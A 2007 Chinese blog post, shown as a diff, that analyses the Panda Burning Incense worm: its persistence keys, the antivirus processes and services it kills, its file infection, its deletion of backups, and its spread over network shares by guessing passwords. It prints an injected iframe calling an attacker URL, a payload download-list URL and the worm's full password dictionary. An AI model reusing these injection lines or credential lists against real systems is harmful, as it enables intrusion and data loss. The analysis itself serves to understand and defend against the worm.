@@ -1,0 +1,300 @@
+---
+author: amosk
+comments: true
+date: 2007-06-22 06:36:24+00:00
+layout: post
+slug: '44'
+title: 熊猫烧香原理
+wordpress_id: 44
+categories:
+- Computer
+- Web
+---
+
+今天下了一个Dephli(带注册机)安装程序和基础教程Pdf,顺便了解了一下熊猫烧香^_^(原代码居然贴不到博客里,强!不过网上随便就可以搜到)
+
+毒名称：Worm.WhBoy.h
+病毒中文名：熊猫烧香(武汉男生)
+
+病毒类型：蠕虫
+
+危险级别：★★★★★
+
+影响平台：Win 9x/ME,Win 2000/NT,Win XP,Win 2003
+
+病毒描述：
+
+“武汉男生”，俗称“熊猫烧香”，这是一个感染型的蠕虫病毒，它能感染系统中exe，com，pif，src，html，asp等文件，它还能中止大量的反病毒软件进程并且会删除扩展名为gho的文件，该文件是一系统备份工具GHOST的备份文件，使用户的系统备份文件丢失。被感染的用户系统中所有.exe可执行文件全部被改成熊猫举着三根香的模样。
+
+<!-- more -->
+
+1:拷贝文件
+
+病毒运行后,会把自己拷贝到C:\WINDOWS\System32\Drivers\spoclsv.exe
+
+2:添加注册表自启动
+
+病毒会添加自启动项HKEY_CURRENT_USER\Software\Microsoft\Windows\
+CurrentVersion\Run svcshare -> C:\WINDOWS\System32\Drivers\spoclsv.exe
+
+3:病毒行为
+
+a:每隔1秒寻找桌面窗口,并关闭窗口标题中含有以下字符的程序：
+
+QQKav、QQAV、防火墙、进程、VirusScan、网镖、杀毒、毒霸、瑞星、江民、黄山IE、超级兔子、优化大师、木马克星、木马清道夫、QQ病毒、注册表编辑器、系统配置实用程序、卡巴斯基反病毒、Symantec AntiVirus、Duba、esteem proces、绿鹰PC、密码防盗、噬菌体、木马辅助查找器、System Safety Monitor、Wrapped gift Killer、Winsock Expert、游戏木马检测大师、msctls_statusbar32、pjf(ustc)、IceSword
+
+并使用的键盘映射的方法关闭安全软件IceSword
+
+添加注册表使自己自启动 HKEY_CURRENT_USER\Software\Microsoft\Windows\
+CurrentVersion\Run svcshare -> C:\WINDOWS\System32\Drivers\spoclsv.exe
+
+并中止系统中以下的进程:
+
+Mcshield.exe、VsTskMgr.exe、naPrdMgr.exe、UpdaterUI.exe、TBMon.exe、scan32.exe、Ravmond.exe、CCenter.exe、RavTask.exe、Rav.exe、Ravmon.exe、RavmonD.exe、RavStub.exe、KVXP.kxp、kvMonXP.kxp、KVCenter.kxp、KVSrvXP.exe、KRegEx.exe、UIHost.exe、TrojDie.kxp、FrogAgent.exe、Logo1_.exe、Logo_1.exe、Rundl132.exe
+
+b:每隔18秒点击病毒作者指定的网页,并用命令行检查系统中是否存在共享，共存在的话就运行net share命令关闭admin$共享
+
+c:每隔10秒下载病毒作者指定的文件,并用命令行检查系统中是否存在共享，共存在的话就运行net share命令关闭admin$共享
+
+d:每隔6秒删除安全软件在注册表中的键值
+
+并修改以下值不显示隐藏文件 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL CheckedValue -> 0x00
+
+删除以下服务:
+
+navapsvc、wscsvc、KPfwSvc、SNDSrvc、ccProxy、ccEvtMgr、ccSetMgr、SPBBCSvc、Symantec Core LC、NPFMntor MskService、FireSvc
+
+e:感染文件
+
+病毒会感染扩展名为exe,pif,com,src的文件,把自己附加到文件的头部，并在扩展名为htm,html, asp,php,jsp,aspx的文件中添加一网址，用户一但打开了该文件，IE就会不断的在后台点击写入的网址，达到增加点击量的目的,但病毒不会感染以下文件夹名中的文件：
+
+WINDOW、Winnt、System Volume Information、Recycled、Windows NT、WindowsUpdate、Windows Media Player、Outlook Express、Internet Explorer、NetMeeting、Common Files、ComPlus Applications、Messenger、InstallShield Installation Information、MSN、Microsoft Frontpage、Movie Maker、MSN Gamin Zone
+
+g:删除文件
+
+病毒会删除扩展名为gho的文件，该文件是一系统备份工具GHOST的备份文件使用户的系统备份文件丢失。
+
+=================================
+
+是一个传染型的DownLoad 使用Delphi编写
+该病毒的主要行为:
+一.传播
+1.本地磁盘感染
+病毒对系统中所有除了盘符为A,B的磁盘类型为DRIVE_REMOTE,DRIVE_FIXED的磁盘进行
+文件遍历感染注:不感染文件大小超过10485760字节以上的.
+(病毒将不感染如下目录的文件):
+Microsoft Frontpage
+Movie Maker
+MSN Gamin Zone
+Common Files
+Windows NT
+Recycled
+System Volume Information
+Documents and Settings
+....
+(病毒将不感染文件名如下的文件):
+setup.exe
+NTDETECT.COM
+病毒将使用两类感染方式应对不同后缀的文件名进行感染
+1.二进制可执行文件(后缀后为:EXE,SCR,PIF,COM)
+将感染目标文件和病毒溶合成一个文件(被感染文件贴在病毒文件尾部)完成感染.
+2.脚本类(后缀名为:htm,html,asp,php,jsp,aspx)
+在这些脚本文件尾加上如下链接(下边的页面存在安全漏洞):
+<iframe src=http://www.krvkr.com/worm.htm width=height=0></iframe>
+在感染时会删除这些磁盘上的后缀名为.GHO
+2.生成autorun.inf
+病毒建立一个计时器以,6秒为周期在磁盘的根目录下生成
+setup.exe(病毒本身) autorun.inf 并利用AutoRun Open关联
+使病毒在用户点击被感染磁盘时能被自动运行.
+3.局域网传播
+病毒生成随机几个局域网传播线程实现如下的传播方式:
+当病毒发现能成功联接攻击目标的139或445端口后,将使用内置的一个用户列表及密码字典
+进行联接.(猜测被攻击端的密码)当成功的联接上以后将自己复制过去并利用计划任务
+启动激活病毒.
+被尝试猜测密码的账户号为:
+Administrator
+Guest
+admin
+Root
+用来进行密码尝试的字典为:
+1234
+password
+6969
+harley
+123456
+golf
+pussy
+mustang
+1111
+shadow
+1313
+fish
+5150
+7777
+qwerty
+baseball
+2112
+letmein
+mein
+12345678
+12345
+admin
+5201314
+qq520
+1234567
+123456789
+654321
+54321
+000000
+11111111
+88888888
+pass
+passwd
+database
+abcd
+abc123
+sybase
+123qwe
+server
+computer
+super
+123asd
+ihavenopass
+godblessyou
+enable
+2002
+2003
+2600
+alpha
+111111
+121212
+123123
+1234qwer
+123abc
+patrick
+administrator
+ator
+root
+fuckyou
+fuck
+test
+test123
+temp
+temp123
+asdf
+qwer
+yxcv
+zxcv
+home
+owner
+login
+Login
+pw123
+love
+mypc
+mypc123
+admin123
+mypass
+mypass123
+901100
+二.修改操作系统的启动关联
+病毒会将自己复制到%SYSTEM32%\DRIVERS\目录下文件名为:spcolsv.exe将以
+1秒钟为周期不断设置如下键值:
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+svcshare=%病毒文件路径%
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows
+\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL
+CheckedValue=0
+三.下载文件启动
+病毒会以20分钟为周期尝试读取特定网站上的下载文件列表
+如:http://wangma.9966.org/down.txt
+并根据文件列表指定的文件下载,并启动这些程序.
+四.与杀毒软件对抗
+1.关闭包含以下字符串的窗口：
+防火墙
+VirusScan
+NOD32
+网镖
+杀毒
+毒霸
+瑞星
+超级兔子
+优化大师
+大师
+木马清道夫
+木馬清道夫
+卡巴斯基反病毒
+Symantec AntiVirus
+Duba
+esteem procs
+绿鹰PC
+密码防盗
+噬菌体
+木马辅助查找器
+System Safety Monitor
+Wrapped gift Killer
+Winsock Expert
+游戏木马检测大师
+超级巡警
+IceSword
+2.结束以下进程：
+Mcshield.exe
+VsTskMgr.exe
+naPrdMgr.exe
+UpdaterUI.exe
+TBMon.exe
+scan32.exe
+Ravmond.exe
+CCenter.exe
+RavTask.exe
+Rav.exe
+Ravmon.exe
+RavmonD.exe
+RavStub.exe
+KVXP.kxp
+KvMonXP.kxp
+KVCenter.kxp
+KVSrvXP.exe
+KRegEx.exe
+UIHost.exe
+TrojDie.kxp
+FrogAgent.exe
+Logo1_.exe
+Logo_1.exe
+Rundl132.exe
+regedit.exe
+msconfig.exe
+taskmgr.exe
+3.关闭并删除以下服务：
+Schedule
+sharedaccess
+RsCCenter
+RsRavMon
+RsCCenter
+KVWSC
+KVSrvXP
+kavsvc
+AVP
+McAfeeFramework
+McShield
+McTaskManager
+navapsvc
+wscsvc
+KPfwSvc
+SNDSrvc
+ccProxy
+ccEvtMgr
+ccSetMgr
+SPBBCSvc
+Symantec Core LC
+NPFMntor
+MskService
+FireSvc
+注:
+因为该病毒会感染系统的htm,html,asp,php,jsp,aspx等文件,并在其中加入有利用安全漏洞进行
+病毒传播的链接.如果一台服务器被感染将大大增加病毒传播的范围.
+
+参考资料:[http://hi.baidu.com/bingduking/blog/item/8d2b9c44f443804c510ffeb0.html](http://hi.baidu.com/bingduking/blog/item/8d2b9c44f443804c510ffeb0.html)
+
+[http://www.stubhub.com/mlb-tickets/](http://www.stubhub.com/mlb-tickets/)
